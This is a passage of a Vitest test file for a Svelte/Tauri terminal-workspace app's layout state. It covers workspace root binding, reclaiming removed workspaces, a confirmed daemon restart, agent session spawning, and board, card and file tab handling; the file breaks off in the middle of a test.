import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { get } from "svelte/store";
import { gavinTrees, worktreeSetups } from "$lib/core/gavinState";
import { executionKeys, executionKeysHash } from "$lib/workspace/workspaceTrust";
import type { LayoutNode } from "$lib/panes/layout";
import { allSessionIds } from "$lib/panes/layout";
import type { Page, Workspace } from "$lib/core/workspace";
import { getActiveView } from "$lib/core/workspace";
import { listen } from "@tauri-apps/api/event";
import { askConfirm } from "$lib/core/dialog";
import { kanbanState } from "$lib/board/kanbanState";
import { orchestrations } from "$lib/orchestration/orchestrationState";
import { toolRecords } from "$lib/orchestration/toolsState";

// setWorkspaceRoot's reclaim offer is the only dialog this module opens.
// Defaults to "Start fresh" so every test that is not about the reclaim
// takes the ordinary binding path.
vi.mock("$lib/core/dialog", () => ({ askConfirm: vi.fn().mockResolvedValue(false) }));
// retryConnect asks before it restarts: the daemon it kills is shared
// with every other gavin window (AS-05/R5). Granting by default keeps
// every other test in this file about what it was about; the two that
// care drive the answer themselves.
vi.mock("$lib/core/confirmGate", () => ({
  DAEMON_SUBJECT: "",
  confirmDestructive: vi.fn().mockResolvedValue("grant"),
  grantForAnsweredPrompt: vi.fn().mockResolvedValue("grant"),
}));

vi.mock("$lib/core/backend", () => ({
  createSession: vi.fn(),
  // Resolved by default: bootstrap asks the host where its temp directory
  // is (for a `until` step's check log) and never awaits the answer, so a
  // mock returning undefined would reject inside a floating promise.
  tempDir: vi.fn().mockResolvedValue("/tmp"),
  // Resolved by default: handleAgentSessionSpawned calls .catch() on this.
  killSession: vi.fn().mockResolvedValue(undefined),
  getWorkspacesState: vi.fn(),
  setWorkspacesState: vi.fn(),
  getBootstrapError: vi.fn(),
  restartDaemon: vi.fn(),
  // Resolved by default: every path that re-syncs against a (re)connected
  // daemon refreshes the compat verdict, and restartDaemonInPlace now
  // awaits it to report what the restart landed on.
  daemonCompat: vi.fn().mockResolvedValue(null),
  writeInput: vi.fn(),
  setOnWriteInputHook: vi.fn(),
  resizeSession: vi.fn(),
  signalFrontendReady: vi.fn(),
  getSessionNames: vi.fn(),
  setSessionName: vi.fn(),
  // Resolved by default: armFailureDetection awaits this inside a
  // try/catch that exists for an OLD daemon, so a mock returning
  // undefined would look like the refusal it swallows.
  setFailurePatterns: vi.fn().mockResolvedValue(undefined),
  deleteBoard: vi.fn(),
  // Resolved by default, like getBoardTabs below: loadTabMaps awaits both
  // before startup may leave "connecting", so a mock returning undefined
  // would wedge every bootstrap test that isn't specifically about file
  // tabs.
  getFileTabs: vi.fn().mockResolvedValue({}),
  // Resolved by default: pruneFileTabs calls .catch() on this, so a bare
  // vi.fn() returning undefined would throw instead of exercising the
  // real best-effort path.
  setFileTabs: vi.fn().mockResolvedValue(undefined),
  setRootConfigField: vi.fn().mockResolvedValue(undefined),
  composeAgentPrompt: vi.fn().mockResolvedValue("prompt"),
  agentProfiles: vi.fn().mockResolvedValue([]),
  getAgentModelDefaults: vi.fn().mockResolvedValue({}),
  getAgentDefaults: vi
    .fn()
    .mockResolvedValue({ customCommand: "", customModelFlag: "", complexity: {}, agentFallback: [] }),
  setAgentDefaults: vi.fn().mockResolvedValue(undefined),
  getTerminalFontSize: vi.fn().mockResolvedValue(null),
  getCustomResumeArgs: vi.fn().mockResolvedValue(null),
  setCustomResumeArgs: vi.fn().mockResolvedValue(undefined),
  getAutoCommit: vi.fn().mockResolvedValue(null),
  getGitTrackingDefault: vi.fn().mockResolvedValue(null),
  getRequireReview: vi.fn().mockResolvedValue(null),
  setAutoCommit: vi.fn().mockResolvedValue(undefined),
  setRequireReview: vi.fn().mockResolvedValue(undefined),
  setTerminalFontSize: vi.fn().mockResolvedValue(undefined),
  mcpFormats: vi.fn().mockResolvedValue([]),
  moveAgentFile: vi.fn().mockResolvedValue(undefined),
  // Resolved by default: endTabs calls .catch() on this, so a bare
  // vi.fn() returning undefined would throw rather than exercise the
  // real best-effort path.
  unwatchFileForViewer: vi.fn().mockResolvedValue(undefined),
  // The window registry (workspace_window.rs). Resolved by default: every
  // caller here is best-effort -- a window that will not open must never
  // take the workspace with it.
  workspaceWindows: vi.fn().mockResolvedValue({}),
  openWorkspaceWindow: vi.fn().mockResolvedValue("ws-1"),
  claimWorkspaceWindow: vi.fn().mockResolvedValue(undefined),
  focusWorkspaceWindow: vi.fn().mockResolvedValue(undefined),
  closeWorkspaceWindow: vi.fn().mockResolvedValue(undefined),
  // Resolved by default: setWorkspaceRoot and watchRootedWorkspaces call
  // .catch() on these.
  watchGavinRoot: vi.fn().mockResolvedValue(undefined),
  unwatchGavinRoot: vi.fn().mockResolvedValue(undefined),
  getBoardTabs: vi.fn().mockResolvedValue({}),
  // Same as the two above: loadTabMaps awaits all three maps before
  // startup may leave "connecting".
  getCardTabs: vi.fn().mockResolvedValue({}),
  // Resolved by default: pruneCardTabs calls .catch() on this.
  setCardTabs: vi.fn().mockResolvedValue(undefined),
  // Resolved by default: bootstrap calls this best-effort to refill the
  // maps a frontend reload starts blank on.
  getSessionBaselines: vi.fn().mockResolvedValue([]),
  // Same: the git half of that refill, keyed by the cwds the call above
  // returned.
  getGitBaselines: vi.fn().mockResolvedValue([]),
  // Resolved by default: the follow-up queue's read-back, which bootstrap
  // calls best-effort for the same reason as the two above.
  listQueuedInputs: vi.fn().mockResolvedValue([]),
  // Resolved by default: pruneBoardTabs calls .catch() on this.
  setBoardTabs: vi.fn().mockResolvedValue(undefined),
  // The three fetches a reclaim fires against the restored id. Empty but
  // well-formed, so the orchestration tick that fetchOrchestration ends
  // in finds nothing to do rather than tripping over a stub.
  getBoard: vi.fn().mockResolvedValue({ columns: [], labels: [], cardSessions: [] }),
  getOrchestration: vi.fn().mockResolvedValue({ rails: [], conflictNotes: [] }),
  getTools: vi.fn().mockResolvedValue([]),
}));

vi.mock("$lib/terminal/terminalRegistry", () => ({
  destroyTerminal: vi.fn(),
  setCwdForLinks: vi.fn(),
  // themeState.init() runs at the top of bootstrap() and pushes the
  // resolved theme into the terminal registry.
  applyTerminalTheme: vi.fn(),
}));

vi.mock("@tauri-apps/api/event", () => ({
  listen: vi.fn().mockResolvedValue(() => {}),
}));

vi.mock("$lib/core/notifications", () => ({
  maybeNotifyStatusChange: vi.fn(),
  // bootstrap() starts the orchestration listeners, which register the
  // rail's voice over this module (see setRailNotificationVoice).
  setRailNotificationVoice: vi.fn(),
  // NOT a vi.fn(): this is a pure parser and every status that reaches
  // the store goes through it, so a mock returning undefined would empty
  // the map these tests are about. The real one is the behaviour under
  // test as much as the store write is.
  parseSessionStatus: (raw: string) =>
    ["idle", "working", "waiting_for_input", "failed", "unknown"].includes(raw)
      ? raw
      : "unknown",
}));

import * as backend from "$lib/core/backend";
import * as notifications from "$lib/core/notifications";
import * as terminalRegistry from "$lib/terminal/terminalRegistry";
import { workspaceWindows } from "$lib/shell/appWindowState";
import {
  layoutState,
  splitPane,
  setTabPinned,
  addTab,
  closeSession,
  switchToTab,
  switchToSessionInPage,
  focusPane,
  handleSessionExited,
  retainTabOnExit,
  handleCwdChanged,
  handleSessionStatusChanged,
  setSessionRead,
  attentionStatusById,
  attentionState,
  handleGitStatusChanged,
  handleSessionRestored,
  handleSessionInterrupted,
  handleSessionOrphaned,
  handleOrphanEnded,
  handleSessionFailed,
  __resetFailureNotices,
  reconcileLayoutSessions,
  restartDaemonInPlace,
  clearRestoredMarker,
  closePane,
  setSessionName,
  createWorkspace,
  renameWorkspace,
  switchWorkspace,
  switchWorkspaceView,
  handOffWorkspace,
  appHubOpen,
  openAppHub,
  closeWorkspace,
  createPage,
  createSessionOnNewPage,
  createSessionForCard,
  openFileInSplit,
  renamePage,
  switchPage,
  closePage,
  movePaneOrTab,
  reorderTabWithinPane,
  reorderWorkspaceAction,
  movePageAction,
  setWorkspaceRoot,
  openBoardInSplit,
  openCardInSplit,
  openFollowUpsInSplit,
  setCardTabPath,
  retargetCardTabs,
  repairUnknownTabs,
  handleAgentSessionSpawned,
  retryConnect,
  bootstrap,
  teardown,
  startMainAgent,
  stopMainAgent,
  agentProfilesStore,
  setWorkspaceColor,
  setWorkspaceFlag,
  setWorkspaceFontSize,
  setTerminalFontSizeDefault,
  terminalFontSizeDefault,
  setWorkspaceCustomResumeArgs,
  setCustomResumeArgsDefault,
  customResumeArgsDefault,
  terminalFontSize,
  setWorkspaceAutoCommit,
  setAutoCommitDefault,
  autoCommitDefault,
  newCardAutoCommit,
  setAgentField,
  setGitViewPrefs,
  startMainAgentWithPrompt,
  runningSessionCount,
  daemonCompat,
  daemonRequestError,
  queuedInputsById,
  handleQueuedInputsChanged,
  cardReviewed,
  stampCardReview,
  setWorkspaceRequireReview,
  setRequireReviewDefault,
  requireReviewDefault,
  markRequireReviewAsked,
  type LayoutState,
} from "$lib/core/layoutState";
import { confirmDestructive } from "$lib/core/confirmGate";

function leaf(tabs: string[], activeTabIndex = 0): LayoutNode {
  return { type: "leaf", tabs, activeTabIndex };
}

function page(id: string, layout: LayoutNode): Page {
  return { id, name: id, layout, focusedSessionId: null };
}

function ws(
  id: string,
  pages: Page[],
  activePageId: string | null = pages[0]?.id ?? null,
  rootPath?: string
): Workspace {
  return { id, name: id, pages, activePageId, rootPath };
}

function setState(workspaces: Workspace[], activeWorkspaceId: string | null, focusedSessionId: string | null): void {
  layoutState.set({
    status: "ready",
    errorMessage: "",
    workspaces,
    activeWorkspaceId,
    focusedSessionId,
    cwdBySessionId: {},
    sessionNames: {},
    sessionStatusById: {},
    statusSinceById: {},
    readSessionIds: new Set(),
    gitStatusById: {},
    restoredSessionIds: new Set(),
    interruptedSessionIds: new Set(),
    orphanBySessionId: {},
    failureReasonById: {},
    sessionsSeenWorking: new Set(),
    fileTabsById: {},
    boardTabsById: {},
    cardTabsById: {},
    removedWorkspaces: [],
  });
}

beforeEach(() => {
  vi.clearAllMocks();
  // Module-level store: without this, one test's seeded agent config
  // resolves in the next one.
  gavinTrees.set({});
  // Module-level store, same reason: the profile table carries the
  // failure patterns a launch arms.
  agentProfilesStore.set([]);
  // Module-level store, same reason: without this, a compat verdict set
  // by one test would leak into the next one's assertions.
  daemonCompat.set(null);
  // Module-level store, same reason.
  daemonRequestError.set(null);
  // Module-level store, same reason: a queue seeded by one test would
  // otherwise still be pending in the next one.
  queuedInputsById.set({});
  // Module-level store, same reason: a workspace parked in another window
  // by one test would make the next one's activation refuse.
  workspaceWindows.set({});
  layoutState.set({
    status: "connecting",
    errorMessage: "",
    workspaces: [],
    activeWorkspaceId: null,
    focusedSessionId: null,
    cwdBySessionId: {},
    sessionNames: {},
    sessionStatusById: {},
    statusSinceById: {},
    readSessionIds: new Set(),
    gitStatusById: {},
    restoredSessionIds: new Set(),
    interruptedSessionIds: new Set(),
    orphanBySessionId: {},
    failureReasonById: {},
    sessionsSeenWorking: new Set(),
    fileTabsById: {},
    boardTabsById: {},
    cardTabsById: {},
    removedWorkspaces: [],
  });
});

describe("setGitViewPrefs", () => {
  it("merges the patch into the workspace's gitView and persists", async () => {
    setState([{ ...ws("ws-1", []), gitView: { diffLayout: "unified", navWidth: 160 } }], "ws-1", null);

    await setGitViewPrefs("ws-1", { diffLayout: "split" });

    expect(get(layoutState).workspaces[0].gitView).toEqual({ diffLayout: "split", navWidth: 160 });
    const persisted = vi.mocked(backend.setWorkspacesState).mock.calls.at(-1)![0];
    expect(persisted.find((w: Workspace) => w.id === "ws-1")?.gitView).toEqual({ diffLayout: "split", navWidth: 160 });
  });

  it("creates gitView when the workspace has none and leaves other workspaces alone", async () => {
    setState([ws("ws-1", []), ws("ws-2", [])], "ws-1", null);

    await setGitViewPrefs("ws-2", { skipHunkDiscardConfirm: true });

    expect(get(layoutState).workspaces[0].gitView).toBeUndefined();
    expect(get(layoutState).workspaces[1].gitView).toEqual({ skipHunkDiscardConfirm: true });
  });
});

describe("setWorkspaceRoot", () => {
  it("persists the root and starts watching", async () => {
    setState([ws("ws-1", [])], "ws-1", null);

    await setWorkspaceRoot("ws-1", "/tmp/root");

    expect(get(layoutState).workspaces[0].rootPath).toBe("/tmp/root");
    expect(backend.setWorkspacesState).toHaveBeenCalled();
    const persisted = vi.mocked(backend.setWorkspacesState).mock.calls.at(-1)![0];
    expect(persisted.find((w: Workspace) => w.id === "ws-1")?.rootPath).toBe("/tmp/root");
    expect(backend.watchGavinRoot).toHaveBeenCalledWith("ws-1", "/tmp/root");
    expect(backend.unwatchGavinRoot).not.toHaveBeenCalled();
  });

  it("unwatches first when re-binding to a different root", async () => {
    setState([{ ...ws("ws-1", []), rootPath: "/tmp/old" }], "ws-1", null);

    await setWorkspaceRoot("ws-1", "/tmp/new");

    expect(backend.unwatchGavinRoot).toHaveBeenCalledWith("ws-1");
    expect(backend.watchGavinRoot).toHaveBeenCalledWith("ws-1", "/tmp/new");
  });
});

describe("reclaiming a removed workspace's rows", () => {
  const tombstone = { id: "old-ws", name: "Gavin", rootPath: "/repo/gavin", removedAt: 100 };

  // Module-level stores, and fetchBoard/fetchOrchestration/fetchTools
  // each short-circuit on an id they already hold -- without this, only
  // the first test in this block would see the fetches fire.
  beforeEach(() => {
    kanbanState.set({});
    orchestrations.set({});
    toolRecords.set({});
  });

  function withTombstone(w: Workspace[]): void {
    setState(w, w[0]?.id ?? null, null);
    layoutState.update((s) => ({ ...s, removedWorkspaces: [tombstone] }));
  }

  it("offers the reclaim when an empty workspace is bound to the removed folder", async () => {
    withTombstone([ws("fresh", [])]);

    await setWorkspaceRoot("fresh", "/repo/gavin");

    expect(vi.mocked(askConfirm).mock.calls[0][0].title).toContain("Gavin");
    // Neither button is a "Cancel": both answers spend the tombstone.
    expect(vi.mocked(askConfirm).mock.calls[0][0]).toMatchObject({
      confirmLabel: "Restore",
      cancelLabel: "Start fresh",
    });
  });

  it("does not offer it for a folder nothing was removed from", async () => {
    withTombstone([ws("fresh", [])]);

    await setWorkspaceRoot("fresh", "/repo/other");

    expect(askConfirm).not.toHaveBeenCalled();
  });

  // Re-pointing a workspace that already holds tabs and a watch is a
  // different question from reclaiming onto an empty one.
  it("does not offer it for a workspace that already has sessions", async () => {
    withTombstone([ws("fresh", [page("p1", leaf(["a"]))])]);

    await setWorkspaceRoot("fresh", "/repo/gavin");

    expect(askConfirm).not.toHaveBeenCalled();
  });

  it("does not offer it for a workspace that is already bound to a root", async () => {
    withTombstone([{ ...ws("fresh", []), rootPath: "/somewhere" }]);

    await setWorkspaceRoot("fresh", "/repo/gavin");

    expect(askConfirm).not.toHaveBeenCalled();
  });

  it("Start fresh binds normally and drops the record so it stops asking", async () => {
    withTombstone([ws("fresh", [])]);
    vi.mocked(askConfirm).mockResolvedValueOnce(false);

    await setWorkspaceRoot("fresh", "/repo/gavin");

    const state = get(layoutState);
    expect(state.workspaces[0].id).toBe("fresh");
    expect(state.workspaces[0].rootPath).toBe("/repo/gavin");
    expect(state.removedWorkspaces).toEqual([]);
    expect(backend.watchGavinRoot).toHaveBeenCalledWith("fresh", "/repo/gavin");
  });

  it("Restore re-keys the workspace, carrying its pages with it", async () => {
    withTombstone([ws("fresh", [page("p1", leaf([]))])]);
    vi.mocked(askConfirm).mockResolvedValueOnce(true);

    await setWorkspaceRoot("fresh", "/repo/gavin");

    const state = get(layoutState);
    expect(state.workspaces.map((w) => w.id)).toEqual(["old-ws"]);
    expect(state.workspaces[0].pages.map((p) => p.id)).toEqual(["p1"]);
    expect(state.workspaces[0].rootPath).toBe("/repo/gavin");
    expect(state.activeWorkspaceId).toBe("old-ws");
    // Spent: the bridge has been crossed.
    expect(state.removedWorkspaces).toEqual([]);
  });

  // The whole point of the re-key: the rows are keyed by the restored
  // id, so every watch and fetch has to name THAT one, never the id the
  // workspace was created with.
  it("Restore unwatches the new id, then watches and fetches the restored one", async () => {
    withTombstone([ws("fresh", [])]);
    vi.mocked(askConfirm).mockResolvedValueOnce(true);

    await setWorkspaceRoot("fresh", "/repo/gavin");

    expect(backend.unwatchGavinRoot).toHaveBeenCalledWith("fresh");
    expect(backend.watchGavinRoot).toHaveBeenCalledWith("old-ws", "/repo/gavin");
    expect(backend.watchGavinRoot).not.toHaveBeenCalledWith("fresh", "/repo/gavin");
    expect(backend.getBoard).toHaveBeenCalledWith("old-ws");
    expect(backend.getOrchestration).toHaveBeenCalledWith("old-ws");
    expect(backend.getTools).toHaveBeenCalledWith("old-ws");
  });

  it("Restore persists the restored id", async () => {
    withTombstone([ws("fresh", [])]);
    vi.mocked(askConfirm).mockResolvedValueOnce(true);

    await setWorkspaceRoot("fresh", "/repo/gavin");

    const [persisted, active, removed] = vi.mocked(backend.setWorkspacesState).mock.calls.at(-1)!;
    expect(persisted.map((w: Workspace) => w.id)).toEqual(["old-ws"]);
    expect(active).toBe("old-ws");
    expect(removed).toEqual([]);
  });
});

describe("retryConnect", () => {
  it("restarts the daemon and comes back ready", async () => {
    setState([], null, null);
    layoutState.update((s) => ({ ...s, status: "error", errorMessage: "older than this app" }));
    vi.mocked(backend.restartDaemon).mockResolvedValue(undefined);
    vi.mocked(backend.getWorkspacesState).mockResolvedValue({ workspaces: [], activeWorkspaceId: null });
    vi.mocked(backend.getBootstrapError).mockResolvedValue(null);

    await retryConnect();

    expect(backend.restartDaemon).toHaveBeenCalledWith("grant");
    await vi.waitFor(() => {
      expect(get(layoutState).status).toBe("ready");
    });
  });

  it("restarts nothing when the confirmation is declined", async () => {
    setState([], null, null);
    layoutState.update((s) => ({ ...s, status: "error", errorMessage: "older than this app" }));
    vi.mocked(confirmDestructive).mockResolvedValueOnce(null);

    await retryConnect();

    expect(backend.restartDaemon).not.toHaveBeenCalled();
    // Still on the error overlay: a declined restart leaves the human
    // exactly where they were, not in a "connecting" state nothing will
    // resolve.
    expect(get(layoutState).status).toBe("error");
  });

  it("surfaces a failed restart", async () => {
    layoutState.update((s) => ({ ...s, status: "error", errorMessage: "boom" }));
    vi.mocked(backend.restartDaemon).mockRejectedValue(new Error("pkill unavailable"));

    await retryConnect();

    const state = get(layoutState);
    expect(state.status).toBe("error");
    expect(state.errorMessage).toContain("pkill unavailable");
  });
});

describe("handleAgentSessionSpawned", () => {
  it("appends to an existing Agents page without changing the active page", () => {
    const agents = { ...page("agents-1", leaf(["a1"])), name: "Agents" };
    setState([ws("ws-1", [page("page-1", leaf(["a"])), agents], "page-1")], "ws-1", "a");

    handleAgentSessionSpawned("ws-1", "spawned-1");

    const state = get(layoutState);
    expect(state.workspaces[0].pages[1].layout).toEqual(leaf(["a1", "spawned-1"], 1));
    expect(state.workspaces[0].activePageId).toBe("page-1");
    expect(backend.setWorkspacesState).toHaveBeenCalled();
    expect(backend.killSession).not.toHaveBeenCalled();
  });

  it("creates the Agents page when absent, keeping the active page", () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))], "page-1")], "ws-1", "a");

    handleAgentSessionSpawned("ws-1", "spawned-1");

    const state = get(layoutState);
    const agents = state.workspaces[0].pages.find((p) => p.name === "Agents");
    expect(agents?.layout).toEqual(leaf(["spawned-1"]));
    expect(state.workspaces[0].activePageId).toBe("page-1");
  });

  it("kills the session when the workspace no longer exists", () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");

    handleAgentSessionSpawned("ws-gone", "spawned-1");

    expect(backend.killSession).toHaveBeenCalledWith("spawned-1");
    expect(backend.setWorkspacesState).not.toHaveBeenCalled();
  });
});

describe("openBoardInSplit", () => {
  it("splits beside the anchor, records the board tab, persists, spawns nothing", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");

    await openBoardInSplit("a", "ws-1", "/ws/auth");

    const state = get(layoutState);
    expect(state.workspaces[0].pages[0].layout.type).toBe("split");
    const boardTabIds = Object.keys(state.boardTabsById);
    expect(boardTabIds).toHaveLength(1);
    expect(state.boardTabsById[boardTabIds[0]]).toEqual({ workspaceId: "ws-1", contextFolder: "/ws/auth" });
    expect(state.focusedSessionId).toBe(boardTabIds[0]);
    expect(backend.setBoardTabs).toHaveBeenCalledWith(state.boardTabsById);
    expect(backend.setWorkspacesState).toHaveBeenCalled();
    expect(backend.createSession).not.toHaveBeenCalled();
  });
});

describe("openCardInSplit", () => {
  it("splits beside the anchor, records the card tab, persists, spawns nothing", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");

    await openCardInSplit("a", "ws-1", "/ws/.gavin-root/plans/login.md", "plan");

    const state = get(layoutState);
    expect(state.workspaces[0].pages[0].layout.type).toBe("split");
    const cardTabIds = Object.keys(state.cardTabsById);
    expect(cardTabIds).toHaveLength(1);
    expect(state.cardTabsById[cardTabIds[0]]).toEqual({
      workspaceId: "ws-1",
      path: "/ws/.gavin-root/plans/login.md",
      view: "plan",
    });
    expect(state.focusedSessionId).toBe(cardTabIds[0]);
    expect(backend.setCardTabs).toHaveBeenCalledWith(state.cardTabsById);
    expect(backend.setWorkspacesState).toHaveBeenCalled();
    expect(backend.createSession).not.toHaveBeenCalled();
  });

  it("brings an already-open view of the same card forward instead of splitting again", async () => {
    // The chip is on a terminal tab the human keeps coming back to; two
    // clicks a minute apart must not leave the page two panes deep in the
    // same card.
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");
    await openCardInSplit("a", "ws-1", "/ws/plans/login.md", "plan");
    const first = Object.keys(get(layoutState).cardTabsById)[0];

    await openCardInSplit("a", "ws-1", "/ws/plans/login.md", "plan");

    const state = get(layoutState);
    expect(Object.keys(state.cardTabsById)).toEqual([first]);
    expect(state.focusedSessionId).toBe(first);
  });

  it("treats the plan and the changes views of one card as different panes", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");
    await openCardInSplit("a", "ws-1", "/ws/plans/login.md", "plan");

    await openCardInSplit("a", "ws-1", "/ws/plans/login.md", "changes");

    expect(Object.keys(get(layoutState).cardTabsById)).toHaveLength(2);
  });

  it("splits again when the only matching tab lives on another page", async () => {
    // The dedupe is a "bring it forward" and cannot bring forward what
    // this page does not hold -- switching pages under a chip click would
    // move the human away from the agent they were watching.
    setState(
      [ws("ws-1", [page("page-1", leaf(["a"])), page("page-2", leaf(["b"]))], "page-1")],
      "ws-1",
      "a"
    );
    await openCardInSplit("a", "ws-1", "/ws/plans/login.md", "plan");
    const onPageOne = Object.keys(get(layoutState).cardTabsById)[0];
    // Move that tab's page out from under the pane: the app is now on
    // page-2, where nothing shows the card.
    layoutState.update((st) => ({
      ...st,
      workspaces: st.workspaces.map((w) => ({ ...w, activePageId: "page-2" })),
    }));

    await openCardInSplit("b", "ws-1", "/ws/plans/login.md", "plan");

    const ids = Object.keys(get(layoutState).cardTabsById);
    expect(ids).toHaveLength(2);
    expect(ids).toContain(onPageOne);
  });

  it("closes like any other non-session tab: no kill, pruned from the map", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");
    await openCardInSplit("a", "ws-1", "/ws/plans/login.md", "changes");
    const tabId = Object.keys(get(layoutState).cardTabsById)[0];
    vi.mocked(backend.killSession).mockClear();

    await closeSession(tabId);

    expect(backend.killSession).not.toHaveBeenCalled();
    expect(get(layoutState).cardTabsById).toEqual({});
    expect(backend.setCardTabs).toHaveBeenLastCalledWith({});
  });
});

describe("card tabs following their card", () => {
  it("setCardTabPath moves ONE pane, leaving a sibling view of the same card alone", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");
    await openCardInSplit("a", "ws-1", "/ws/plans/login.md", "plan");
    await openCardInSplit("a", "ws-1", "/ws/plans/login.md", "changes");
    const [planTab, changesTab] = Object.keys(get(layoutState).cardTabsById);

    await setCardTabPath(planTab, "/ws/plans/child.md");

    const map = get(layoutState).cardTabsById;
    expect(map[planTab].path).toBe("/ws/plans/child.md");
    expect(map[changesTab].path).toBe("/ws/plans/login.md");
  });

  it("retargetCardTabs moves every pane on the card, because the FILE moved", async () => {
    // Setting a card Done files it under plans/done/. Both panes are
    // still looking at the same card, so both have to follow.
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");
    await openCardInSplit("a", "ws-1", "/ws/plans/login.md", "plan");
    await openCardInSplit("a", "ws-1", "/ws/plans/login.md", "changes");

    await retargetCardTabs("/ws/plans/login.md", "/ws/plans/done/login.md");

    const paths = Object.values(get(layoutState).cardTabsById).map((t) => t.path);
    expect(paths).toEqual(["/ws/plans/done/login.md", "/ws/plans/done/login.md"]);
  });
});

// `bootstrap()` is +page.svelte's onMount, and under `tauri dev` an edit
// that reaches +page.svelte without reaching THIS module destroys and
// recreates the page while the store keeps running: the layout tree
// survives, and bootstrap runs a second time against it. loadTabMaps then
// re-reads Rust's copy of the two maps -- and the store is AHEAD of Rust
// for the whole flight of openBoardInSplit's `set_board_tabs`, which is
// mirrored to Rust only after the store already holds the entry. Copying
// Rust's map over the store's therefore drops the new tab's entry while
// its id stays in the tree, which is exactly the state Pane.svelte reads
// as a terminal session (see ClosedTabs) -- a real xterm, a `pty-output`
// listener and a resize the daemon refuses, for an id it never had.
//
// The two writers the bug report suspected are innocent: pruneBoardTabs
// and repairBoardTabs both `get(layoutState)` and update with no await in
// between, so neither can carry a stale snapshot across one. loadTabMaps
// is the only whole-map writer that reads across a round trip.
describe("the tab maps against a store Rust has not caught up with", () => {
  async function bootstrapAgain(): Promise<void> {
    vi.mocked(backend.getWorkspacesState).mockResolvedValue({
      workspaces: get(layoutState).workspaces,
      activeWorkspaceId: "ws-1",
    });
    vi.mocked(backend.getBootstrapError).mockResolvedValue(null);
    vi.mocked(backend.getSessionNames).mockResolvedValue({});
    await bootstrap();
    await vi.waitFor(() => expect(backend.getBoardTabs).toHaveBeenCalled());
  }

  it("keeps a board tab whose set_board_tabs has not landed yet", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");
    // Still in flight: Rust has not been told about this tab, so its
    // get_board_tabs still answers with the map from before the click.
    vi.mocked(backend.setBoardTabs).mockImplementationOnce(() => new Promise(() => {}));
    vi.mocked(backend.getBoardTabs).mockResolvedValue({});
    vi.mocked(backend.getFileTabs).mockResolvedValue({});

    void openBoardInSplit("a", "ws-1", "/ws/auth");
    const tabId = Object.keys(get(layoutState).boardTabsById)[0];
    expect(allSessionIds(get(layoutState).workspaces[0].pages[0].layout)).toContain(tabId);

    await bootstrapAgain();

    // Still in the tree, so it must still be classified: an id in a tree
    // and in neither map IS a terminal as far as Pane.svelte is concerned.
    expect(allSessionIds(get(layoutState).workspaces[0].pages[0].layout)).toContain(tabId);
    expect(get(layoutState).boardTabsById[tabId]).toEqual({
      workspaceId: "ws-1",
      contextFolder: "/ws/auth",
    });
  });

  it("keeps a file tab whose set_file_tabs has not landed yet", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");
    vi.mocked(backend.setFileTabs).mockImplementationOnce(() => new Promise(() => {}));
    vi.mocked(backend.getBoardTabs).mockResolvedValue({});
    vi.mocked(backend.getFileTabs).mockResolvedValue({});

    void openFileInSplit("a", "/ws/readme.md");
    const tabId = Object.keys(get(layoutState).fileTabsById)[0];

    await bootstrapAgain();

    expect(allSessionIds(get(layoutState).workspaces[0].pages[0].layout)).toContain(tabId);
    expect(get(layoutState).fileTabsById[tabId]).toEqual({ path: "/ws/readme.md" });
  });

  // The seed is still a seed: a tab Rust knows about and the store does
  // not -- every restored board and file tab, on every real startup --
  // has to arrive.
  it("still takes the entries only Rust has", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");
    vi.mocked(backend.getBoardTabs).mockResolvedValue({
      "bt-1": { workspaceId: "ws-1", contextFolder: "/ws/auth" },
    });
    vi.mocked(backend.getFileTabs).mockResolvedValue({ "ft-1": "/ws/readme.md" });

    await bootstrapAgain();

    expect(get(layoutState).boardTabsById["bt-1"]).toEqual({
      workspaceId: "ws-1",
      contextFolder: "/ws/auth",
    });
    expect(get(layoutState).fileTabsById["ft-1"]).toEqual({ path: "/ws/readme.md" });
  });
});

// Pane.svelte reads "in neither map" as "daemon session", which is also
// what a board or file tab looks like the moment its entry is lost --
// nothing about the id itself distinguishes them. So before a pane is
// left standing as a terminal, the other copy of the classification gets
// asked.
describe("repairUnknownTabs", () => {
  it("puts back a board tab Rust still classifies, and destroys the terminal built for it", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a", "bt-1"]))])], "ws-1", "a");
    vi.mocked(backend.getFileTabs).mockResolvedValue({});
    vi.mocked(backend.getBoardTabs).mockResolvedValue({
      "bt-1": { workspaceId: "ws-1", contextFolder: "/ws/auth" },
    });

    await repairUnknownTabs(["a", "bt-1"]);

    expect(get(layoutState).boardTabsById["bt-1"]).toEqual({
      workspaceId: "ws-1",
      contextFolder: "/ws/auth",
    });
    // Nothing else ever would: destroyTerminal is only reached from a
    // close path, and this tab is not closing.
    expect(terminalRegistry.destroyTerminal).toHaveBeenCalledWith("bt-1");
    expect(terminalRegistry.destroyTerminal).not.toHaveBeenCalledWith("a");
  });

  it("puts back a file tab Rust still classifies", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["ft-1"]))])], "ws-1", "ft-1");
    vi.mocked(backend.getFileTabs).mockResolvedValue({ "ft-1": "/ws/readme.md" });
    vi.mocked(backend.getBoardTabs).mockResolvedValue({});

    await repairUnknownTabs(["ft-1"]);

    expect(get(layoutState).fileTabsById["ft-1"]).toEqual({ path: "/ws/readme.md" });
  });

  // The common case by far: every ordinary terminal reaches here, and it
  // must cost one question in the whole app run, not one per render.
  it("leaves a real session alone and asks about it only once", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["sess-1"]))])], "ws-1", "sess-1");
    vi.mocked(backend.getFileTabs).mockResolvedValue({});
    vi.mocked(backend.getBoardTabs).mockResolvedValue({});

    await repairUnknownTabs(["sess-1"]);
